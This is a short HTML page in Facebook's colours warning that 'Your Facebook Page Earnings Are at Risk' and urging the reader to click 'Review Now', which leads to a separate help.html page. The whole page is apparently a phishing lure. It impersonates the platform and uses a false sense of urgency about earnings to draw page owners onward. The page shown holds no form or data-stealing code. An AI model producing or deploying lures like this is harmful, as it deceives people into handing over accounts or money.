<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Page Alert</title>
  <style>
    body{
      font-family: Arial, sans-serif;
      background:#f0f2f5;
      display:flex;
      justify-content:center;
      align-items:center;
      height:100vh;
      margin:0;
    }
    .box{
      background:#fff;
      padding:30px;
      border-radius:12px;
      width:340px;
      box-shadow:0 5px 20px rgba(0,0,0,.2);
      text-align:center;
    }
    h2{color:#1877f2}
    button{
      margin-top:20px;
      padding:12px;
      width:100%;
      background:#1877f2;
      color:#fff;
      border:none;
      border-radius:8px;
      cursor:pointer;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Your Facebook Page Earnings Are at Risk</h2>
    <p>Please review your page to protect your bonus.</p>
    <button onclick="location.href='help.html'">Review Now</button>
  </div>
</body>
</html>
